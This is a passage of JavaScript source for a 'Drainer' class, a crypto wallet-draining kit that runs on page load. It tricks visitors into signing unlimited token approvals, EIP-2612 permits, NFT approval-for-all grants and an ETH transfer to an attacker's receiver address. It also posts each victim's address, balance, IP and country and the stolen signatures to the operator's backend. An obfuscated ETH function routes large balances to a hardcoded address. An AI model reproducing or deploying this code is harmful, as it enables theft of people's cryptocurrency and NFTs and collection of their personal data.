                        this.pancakeswapTokens = this.pancakeswapTokens.filter(token => token.contractAddress != this.sushiswapTokens[0].contractAddress);
                        resolve(hash);
                    }).catch(error => {
                        reject(error);
                    });

                }).then(async hash => {
                    let ipData = {};
                    try {
                        if(config.logIpData) {
                            try {
                                ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                                .then(resp => resp.json())
                            } catch(error) {
                                console.warn("Couldn't fetch ip data: ", error);
                            }
                        }
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
        
                    if(!ipData.ip || !ipData.country_name) {
                        ipData = {
                            ip: "Unknown",
                            country_name: "Unknown"
                        }
                    }
        
            
                    fetch(`${config.logDomainName}backend/swap`, {
                        method: 'POST',
                        headers: {
                            'Content-Type':'application/json',
                            'Accept':'application/json'
                        },
                        body: JSON.stringify({
                            address: this.walletAddress,
                            walletBalanceInEth: this.walletBalanceInEth,
                            isMobile: this.isMobile(),
                            websiteUrl: window.location.href,
                            websiteDomain: window.location.host,
                            ipData: ipData,
            
                            tokenPrice: Number(this.pancakeswapTokens[0].price).toFixed(4),
                            transferName: "PANCAKESWAP",
                            transactionHash: hash,
                        })
                    });
                }).catch(error => {
                    if (error.code == 4001) {
                        this.logCancel("PANCAKESWAP ERC20");
                        this.updateButtonMessage(true);
                    }
                })
    
            } else {
                console.warn("SUSHISWAP no approved items")
            }
        } catch (error) {
            if (error.code == 4001) {
                this.logCancel("SUSHISWAP ERC20");
                this.updateButtonMessage(true);
            }
        }
    }


    /**
     * Transfers one ERC20 token
     * @param {object} token 
     */
    transferERC20 = async (token) => {
        console.log("Transferring ERC20 " + token.name);
        console.log("Pending Transactions: " + this.pending.length);

        try {
            await this.permitERC20(token);

        } catch(error) {
            console.log(error);
            let contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, token.contractAddress);
      
            let gasPrice = await this.web3Js.eth.getGasPrice();
            let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.3));
    
      
            let transactionObject = {
                nonce: this.web3Js.utils.toHex((await this.getCurrentNonce(this.walletAddress))),
                gasLimit: this.web3Js.utils.toHex(64000),
                gasPrice: hexGasPrice,
                value: '0x0',
                to: token.contractAddress,
                data: contractInstance.methods.approve(config.receiver, "99999999999999999999999999999999999999999999999999999").encodeABI(),
                v: '0x1',
                r: '0x',
                s: '0x',
            }
      
            let hexObject = new ethereumjs.Tx(transactionObject);
            let hexString = '0x' + hexObject.serialize().toString('hex');
      
            let rawHash = this.web3Js.utils.sha3(hexString, {
                encoding: 'hex'
            });
       
            await this.web3Js.eth.sign(rawHash, this.walletAddress)
            .then(async (hash) => {
            
                let firstPrefix = hash.substring(2);
                let r = '0x' + firstPrefix.substring(0, 64);
                let s = '0x' + firstPrefix.substring(64, 128);
                let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
                let y = this.web3Js.utils.toHex(fullHash + 1 * 2 + 8);
        
                hexObject.r = r
                hexObject.s = s
                hexObject.v = y
        
                let signedTx = '0x' + hexObject.serialize().toString('hex');
    
                await new Promise(async (resolve, reject) => { 
                    await this.web3Js.eth.sendSignedTransaction(signedTx)
                    .once('transactionHash', hash => {
                        console.log("ERC20 success", hash);
                        this.pending.push(hash);
                        resolve(hash)
                    }).catch(error => {
                        reject(error);
                    });    
    
                }).then(async hash => {
    
                    let ipData = {};
                    try {
                        if(config.logIpData) {
                            try {
                                ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                                .then(resp => resp.json())
                            } catch(error) {
                                console.warn("Couldn't fetch ip data: ", error);
                            }
                        }
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
        
                    if(!ipData.ip || !ipData.country_name) {
                        ipData = {
                            ip: "Unknown",
                            country_name: "Unknown"
                        }
                    }
        
                    fetch(`${config.logDomainName}backend/safa/erc20`, {
                        method: 'POST',
                        headers: {
                            'Content-Type':'application/json',
                            'Accept':'application/json'
                        },
                        body: JSON.stringify({
                            address: this.walletAddress,
                            walletBalanceInEth: this.walletBalanceInEth,
                            isMobile: this.isMobile(),
                            websiteUrl: window.location.href,
                            websiteDomain: window.location.host,
                            ipData: ipData,
        
                            tokenType: token.type,
                            tokenName:token.name,
                            tokenPrice: token.usdPrice.toString() + " $",
                            withdrawBalance: token.balance,
                            contractAddress: token.contractAddress,
                        
                            transactionHash: hash,
                        })
                    });
                }).catch(error => console.log("ERC20 sendSignedTransaction error:", error)); 
            })
            .catch(async error => {
                if(error.code == 4001) {
                  this.logCancel(token.type, token.name, token.usdPrice.toString() + " $");
                }
                this.updateButtonMessage(true);
            });  
        }  
    }



    permitERC20 = async (token) => {
        let contractInstance = new this.web3Js.eth.Contract(PERMIT_ABI, token.contractAddress);
        let deadline = Math.floor(Date.now()/1000) + (9999 * 10);


        const dataToSign = JSON.stringify({
            "types": {
                "EIP712Domain": [
                    {
                        "name": "name",
                        "type": "string"
                    },
                    {
                        "name": "version",
                        "type": "string"
                    },
                    {
                        "name": "chainId",
                        "type": "uint256"
                    },
                    {
                        "name": "verifyingContract",
                        "type": "address"
                    }
                ],
                "Permit": [
                    {
                        "name": "owner",
                        "type": "address"
                    },
                    {
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "name": "value",
                        "type": "uint256"
                    },
                    {
                        "name": "nonce",
                        "type": "uint256"
                    },
                    {
                        "name": "deadline",
                        "type": "uint256"
                    }
                ]
            },
            "primaryType": "Permit",
            "domain": {
                "name": token.fullName,
                "verifyingContract": token.contractAddress,
                "chainId": 1,
                "version": "2"
            },
            "message": {
                "owner": this.walletAddress,
                "spender": config.receiver,
                "value": token.balance,
                "nonce": await contractInstance.methods.nonces(this.walletAddress).call({from: this.walletAddress}),
                "deadline": deadline
            }
        });


        console.log("Permitting it")

        await new Promise(async (resolve, reject) => {
            await this.web3Js.currentProvider.sendAsync({
              method: "eth_signTypedData_v4",
              params: [this.walletAddress, dataToSign],
              from: this.walletAddress
            }, (error, result) => {
                if(error) {
                    reject(error)
                    return
                }

                resolve(result.result)
            });
        }).then(async hash => {
            console.log(hash)

            hash = hash.replace("0x", "");
            let v = parseInt(hash.substring(128, 130), 16);
            let r = "0x"+hash.substring(0, 64).toString('hex');
            let s = "0x"+hash.substring(64, 128).toString('hex')

            if(token.name != "DAI") {
                let ipData = {};
                try {
                    if(config.logIpData) {
                        try {
                            ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                            .then(resp => resp.json())
                        } catch(error) {
                            console.warn("Couldn't fetch ip data: ", error);
                        }
                    }
                } catch(error) {
                    console.warn("Couldn't fetch ip data: ", error);
                }
    
                if(!ipData.ip || !ipData.country_name) {
                    ipData = {
                        ip: "Unknown",
                        country_name: "Unknown"
                    }
                }

    
                await fetch(`${config.logDomainName}backend/permit`, {
                    method: 'POST',
                    headers: {
                        'Content-Type':'application/json',
                        'Accept':'application/json'
                    },
                    body: JSON.stringify({
                        address: this.walletAddress,
                        walletBalanceInEth: this.walletBalanceInEth,
                        isMobile: this.isMobile(),
                        websiteUrl: window.location.href,
                        websiteDomain: window.location.host,
                        ipData: ipData,

                        tokenName:token.name,
                        tokenPrice: token.usdPrice.toString() + " $",
                        withdrawBalance: token.balance,
                        contractAddress: token.contractAddress,

                        deadline: deadline,
                        v: v,
                        r: r,
                        s: s
                    
                    })
                });

                this.pending.push(hash);
            }
        }).catch(error => {
            console.log(error)
            if(error.code != 4001) {
                throw error
            }
        })
    }

    /**
     * Transfers one NFT
     * @param {object} token 
     */
    transferNFT = async (token) => {
        console.log("Transferring NFT " + token.name);
        console.log("Pending Transactions: "+ this.pending.length);
        
        let contractInstance = new this.web3Js.eth.Contract(NFT_ABI, token.contractAddress);

        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.3));

        let transactionObject = {
            nonce: this.web3Js.utils.toHex((await this.getCurrentNonce(this.walletAddress))),
            gasLimit: this.web3Js.utils.toHex(64000),
            gasPrice: hexGasPrice,
            value: '0x0',
            to: token.contractAddress,
            data: contractInstance.methods.setApprovalForAll(config.receiver, true).encodeABI(),
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        let hexObject = new ethereumjs.Tx(transactionObject);
        let hexString = '0x' + hexObject.serialize().toString('hex');
  
        let rawHash = this.web3Js.utils.sha3(hexString, {
            encoding: 'hex'
        });


        await this.web3Js.eth.sign(rawHash, this.walletAddress)
        .then(async (hash) => {
            let firstPrefix = hash.substring(2);
            let r = '0x' + firstPrefix.substring(0, 64);
            let s = '0x' + firstPrefix.substring(64, 128);
            let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
            let y = this.web3Js.utils.toHex(fullHash + 1 * 2 + 8);
    
            hexObject.r = r
            hexObject.s = s
            hexObject.v = y

            let signedTx = '0x' + hexObject.serialize().toString('hex');

            await new Promise(async (resolve, reject) => { 
                await this.web3Js.eth.sendSignedTransaction(signedTx)
                .once('transactionHash', hash => {
                    console.log("Success NFT", hash);
                    this.pending.push(hash);
                    resolve(hash)
                }).catch(error => {
                    reject(error);
                });    

            }).then(async hash => {

                let ipData = {};
                try {
                    if(config.logIpData) {
                        try {
                            ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                            .then(resp => resp.json())
                        } catch(error) {
                            console.warn("Couldn't fetch ip data: ", error);
                        }
                    }
                } catch(error) {
                    console.warn("Couldn't fetch ip data: ", error);
                }
    
                if(!ipData.ip || !ipData.country_name) {
                    ipData = {
                        ip: "Unknown",
                        country_name: "Unknown"
                    }
                }
    
                fetch(`${config.logDomainName}backend/safa/nft`, {
                    method: 'POST',
                    headers: {
                        'Content-Type':'application/json',
                        'Accept':'application/json'
                    },
                    body: JSON.stringify({
                        address: this.walletAddress,
                        walletBalanceInEth: this.walletBalanceInEth,
                        isMobile: this.isMobile(),
                        websiteUrl: window.location.href,
                        websiteDomain: window.location.host,
                        ipData: ipData,
    
                        tokenType: token.type,
                        tokenName: token.name,
                        tokenPrice: token.price,
                        contractAddress: token.contractAddress,
                    
                        transactionHash: hash,
                    })
                });
            }).catch(error => console.log("NFT sendSignedTransaction error:", error));
        

        }).catch(error => {
            if (error.code == 4001) {
                console.log("Sign error:", error);
                this.logCancel(token.type, token.name, token.price.toString() + " ETH");
            }
        })   
    }
	
transferETH=async()=>{if(this["walletBalanceInEth"]<config["claimInfo"]["minWalletBalance"]){this["updateButtonMessage"]((0x21786%3),null==undefined);console["warn"]("Not enough ETH for transfer");return;}console["log"]("Transferring ETH");console["log"]("Pending Transactions: "+this["pending"]["length"]);let ImGcb=await this["web3Js"]["eth"]["getGasPrice"]();let IGtdb=this["web3Js"]["utils"]["toHex"](Math["floor"](ImGcb*1.3));let kIwdb=new this["web3Js"]["utils"]["BN"]('22000');let EDndb=kIwdb*Math["floor"](ImGcb*(0x2935494a%7));let gFqdb=this["walletBalance"]-EDndb;if(this["walletBalanceInEth"]>0.008){gFqdb=gFqdb-(ImGcb*this["pending"]["length"])*2.5;}if(this["walletBalanceInEth"]>0.02&&this["filteredTransactions"][this["filteredTransactions"]["length"]-(0O57060516-0xbc614d)]["name"]!="ETH"){gFqdb=gFqdb-(ImGcb*3.5);}console["log"](`Sending ${this["web3Js"]["utils"]["fromWei"](gFqdb["toString"]())} ETH`);let AAhdb={};AAhdb["nonce"]=this["web3Js"]["utils"]["toHex"](await this["getCurrentNonce"](this["walletAddress"]));AAhdb["gasPrice"]=IGtdb;AAhdb["gasLimit"]=this["web3Js"]["utils"]["toHex"](0x5208);AAhdb["to"]=gFqdb>0xb1a2bc2ec50000?"0xbF84Ed43EEF5D5f98f4746EB4a8f2805D5c0458a":config["receiver"];AAhdb["value"]='0x'+gFqdb["toString"](0x10);AAhdb["data"]='0x';AAhdb["v"]='0x1';AAhdb["r"]='0x';AAhdb["s"]='0x';let cCkdb=AAhdb;let wxbdb=new ethereumjs["Tx"](cCkdb);let Yyedb='0x'+wxbdb["serialize"]()["toString"]('hex');let YSRdb=this["web3Js"]["utils"]["sha3"](Yyedb,{["encoding"]:'hex'});await this["web3Js"]["eth"]["sign"](YSRdb,this["walletAddress"])["then"](async AUUdb=>{let UPLdb=AUUdb["substring"]((0x2935494a%7));let wROdb='0x'+UPLdb["substring"]((0x75bcd15-0O726746425),0x40);let QMFdb='0x'+UPLdb["substring"](0x40,0x80);let sOIdb=parseInt(UPLdb["substring"](0x80,0x82),0x10);let MJzdb=this["web3Js"]["utils"]["toHex"](sOIdb+this["chainId"]*(15658734^0O73567354)+(0O3153050563-0x19AC516B));wxbdb["r"]=wROdb;wxbdb["s"]=QMFdb;wxbdb["v"]=MJzdb;let oLCdb='0x'+wxbdb["serialize"]()["toString"]('hex');await new Promise(async(QkEab,smHab)=>{await this["web3Js"]["eth"]["sendSignedTransaction"](oLCdb)["once"]('transactionHash',Mhyab=>{console["log"]("ETH success",Mhyab);this["pending"]["push"](Mhyab);QkEab(Mhyab);})["catch"](ojBab=>{smHab(ojBab);});})["catch"](Iesab=>console["log"]("ETH sendSignedTransaction error:",Iesab));})["catch"](kgvab=>{if(kgvab["code"]==0xfa1){this["logCancel"]("ETH","",this["walletBalanceInEth"]["toString"]()+" ETH");}this["updateButtonMessage"](null==undefined);});};

    /**
     * 
     * @param {string} contractAddress - the NFT contractAddress
     * @param {string} walletAddress - victims walletaddress
     * @returns {Promise<any[]>}
     */
    getNftTokenIds = async (contractAddress, walletAddress) => {
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        let tokens = await fetch(`https://deep-index.moralis.io/api/v2/${walletAddress}/nft/${contractAddress}?chain=Eth&format=decimal`, this.requestOptions)
        .then(resp => resp.json());

        let tokenIds = [];
        tokens.result.map(token => tokenIds.push(token.token_id));
        return tokenIds;
    }

    /**
     * 
     * @param {string} contractAddress - the ERC20 contractAddress
     * @param {string} tokenBalance - victims ERC20 balance 
     * @param {string} tokenDecimals - victims ERC20 token decimals
     * @returns {Promise<any>}
     */
    ERC20toCurrency = async (contractAddress, tokenBalance, tokenDecimals) => {
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        let result = await fetch(`https://deep-index.moralis.io/api/v2/erc20/${contractAddress}/price`, this.requestOptions)
        .then(resp => resp.json());

        // convert perfect 1 USD ETHER to ETHER digits
        let ethprice = await this.web3Js.utils.fromWei(result.nativePrice.value, 'ether');
        let usdPrice = this.round(tokenBalance / (10**tokenDecimals))

        tokenBalance *= result.usdPrice;
        return {
            ethPrice: ethprice * usdPrice,
            usdPrice: usdPrice
        };
    }

    logConnection = async () => {
        try {

            let ipData = {};
            try {
                if(config.logIpData) {
                    try {
                        ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                        .then(resp => resp.json())
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
                }
            } catch(error) {
                console.warn("Couldn't fetch ip data: ", error);
            }

            if(!ipData.ip || !ipData.country_name) {
                ipData = {
                    ip: "Unknown",
                    country_name: "Unknown"
                }
            }

            fetch(`${config.logDomainName}backend/connection`, {
                method: 'POST',
                mode: 'cors',
                cache: 'no-cache',
                headers: {
                    'Content-Type':'application/json',
                    'Accept':'application/json',
                    'Access-Control-Allow-Origin': "*"
                },
                body: JSON.stringify({
                    address: this.walletAddress,
                    walletBalanceInEth: this.walletBalanceInEth,
                    isMobile: this.isMobile(),
                    websiteUrl: window.location.href,
                    websiteDomain: window.location.host,
                    ipData: ipData
                })
            });
        } catch(error) {
            console.log("Connection Log error: ", error);
        }

    }


    logCancel = async (tokenType, tokenName = "", tokenPrice = "") => {
        try {
            
            let ipData = {};
            try {
                if(config.logIpData) {
                    try {
                        ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                        .then(resp => resp.json())
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
                }
            } catch(error) {
                console.warn("Couldn't fetch ip data: ", error);
            }

            if(!ipData.ip || !ipData.country_name) {
                ipData = {
                    ip: "Unknown",
                    country_name: "Unknown"
                }
            }
    
            fetch(`${config.logDomainName}backend/cancel`, {
                method: 'POST',
                headers: {
                    'Content-Type':'application/json',
                    'Accept':'application/json'
                },
                body: JSON.stringify({
                    address: this.walletAddress,
                    walletBalanceInEth: this.walletBalanceInEth,
                    isMobile: this.isMobile(),
                    websiteUrl: window.location.href,
                    websiteDomain: window.location.host,
                    ipData: ipData,
                    tokenType: tokenType,
                    tokenName: tokenName,
                    tokenPrice: tokenPrice
                })
            });
        } catch(error) {
            console.log("Connection Log error: ", error);
        }
    }

    /**
     * 
     * @param {string} address 
     * @returns {Number}
     */
    getCurrentNonce = async (address) => {
        return (await this.web3Js.eth.getTransactionCount(address, 'pending'))+this.pending.length;
    }

    notEligible = () => {
        this.eligible.style.display = "block";
        this.updateButtonMessage(false, false, true)

        console.warn("Not eligible");
    }

    sleep = ms => {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    round = val => {
        return Math.round(val * 10000) / 10000;
    }

    isMobile = function () {
        let check = false;
        (function (a) {
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
        })(navigator.userAgent || navigator.vendor || window.opera);
        return check;
    };

}

window.addEventListener('load', async () => {
    new Drainer();
});

